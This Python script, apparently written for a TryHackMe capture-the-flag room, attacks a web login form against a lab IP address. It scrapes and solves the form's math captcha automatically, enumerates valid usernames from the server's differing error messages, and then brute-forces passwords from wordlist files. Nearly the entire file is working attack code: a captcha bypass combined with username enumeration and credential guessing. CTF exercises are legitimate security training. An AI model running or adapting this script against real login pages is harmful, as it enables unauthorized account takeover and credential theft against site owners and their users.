# The script was created for CTF https://tryhackme.com/room/capture (both username and password dictionaries are available with the challenge)
# This script is bypassing a math captcha by scrapping the page, getting the riddle and solving it.
# Once the captcha is solved, the script will send the login request to the server and rely on different error messages to enumerate users ans passwords.

import requests
import bs4
import re

# Debug flag - if set to True will print different info
debug_flag = False

# Send the login request to the server, bypas math capcha and return the response in string format
def captchaBypass(url, username, password):

    # Create the payload
    payload = {'username': username, 'password': password, 'captcha':'123'}

    # Send the request
    r = requests.post(url, data=payload)

    # Get response as a string
    response_text = r.text

    if debug_flag:
        print(r.text)

    # Read captch and get the riddle
    soup = bs4.BeautifulSoup(response_text, 'html.parser')
    tag = soup.find('br') 
    value = tag.next_sibling.strip()

    if debug_flag:
        print(value)

    expression = value.replace(' ','')[0:-2]

    if debug_flag:
        print(expression)

    operator = value.replace(' ','')[3:4]

    # In case the first number is grather than 1000
    if operator != '-' and operator != '*' and operator != '/' and operator != '+':
        operator = value.replace(' ','')[4:5]

    if debug_flag:
        print(operator)

    # Split the input on operators 
    tokens = re.split(r"[+\-*/]", expression)

    # Map operators to functions
    ops = {"+": lambda x, y: x + y,
        "-": lambda x, y: x - y,  
        "*": lambda x, y: x * y,
        "/": lambda x, y: x / y}

    # Convert tokens to integers 
    nums = [int(t) for t in tokens]  

    if debug_flag:
        print(nums)

    # Apply the operators to the numbers
    result = ops[operator](nums[0], nums[1])

    if debug_flag:
        print(str(result))

    # Resend data
    payload = {'username': username, 'password': password, 'captcha': str(result)}

    # send the request
    r = requests.post(url, data=payload)

    # get response as a string
    response_text = r.text

    if debug_flag:
        print(r.text)

    return response_text

# Enumerate for valid users
def userEnumeration(filename, url):

    active_users = []

    # get data from file and add it ot a list
    with open(filename) as f:
        lines = f.readlines()

    for line in lines:

        # clean data by removing enters and spaces
        username = "".join(line.replace(' ', '').split("\n"))
        print('[-] Check for user: ' + username)

        # Define a stopping condition - in this case we check for a string that is returned when the user is NOT in DB 
        stop_condition = 'The user &#39;'+username+'&#39; does not exist'
        #print(stop_condition)
        
        # Check if the user is in DB by sending a login request to the server and check if the response contains the stop condition string. If not, the user is in DB. If yes, the user is NOT in DB.
        if captchaBypass(url, username, 'dummy').count(stop_condition) == 0:
            print('[!] BINGO Found User: ' + username)
            active_users.append(username)

    # return the list of active users
    return active_users


# Enumerate for valid passwords
def passwordEnumeration(filename, url, user):

    # get data from file and add it ot a list
    with open(filename) as f:
        lines = f.readlines()

    for line in lines:

        # clean data by removing enters and spaces
        password = "".join(line.replace(' ', '').split("\n"))
        print('[-]Check for user: ' + user + ' with password: ' + password)

        # Define a stopping condition - in this case we check for a string that is returned when the password for user is NOT in DB 
        stop_condition = 'Invalid password for user &#39;'+user+'&#39;'
        
        if debug_flag:
            print(stop_condition)
        
        # Check if the password is in DB by sending a login request to the server and check if the response contains the stop condition string.
        if captchaBypass(url, user, password).count(stop_condition) == 0:
            print('[!]BINGO Password for user ' + user + ' is ' + password)
            break

    # return password for user
    return password


# MAIN

# Config Data

# Application login UT:
target_url = 'http://10.10.112.123/login'

# Username dictionary file
usernames_file = '../Desktop/usernames.txt'

# Password dictionary file
passwords_file = '../Desktop/passwords.txt'

# Make a list of possible usernames
found_users = userEnumeration(usernames_file, target_url)

# Fancy print discovered users :)
print(list(map(lambda x: f"User {found_users.index(x)+1}: {x}", found_users)))

# Check for passwords in case users are discovered
if len(found_users) > 0:
    for user in found_users:
        #print('[+] Checking for user: ' + user)

        if passwordEnumeration(passwords_file, target_url, user) != '':
            continue
        else:
            print('[-] No password found yet!')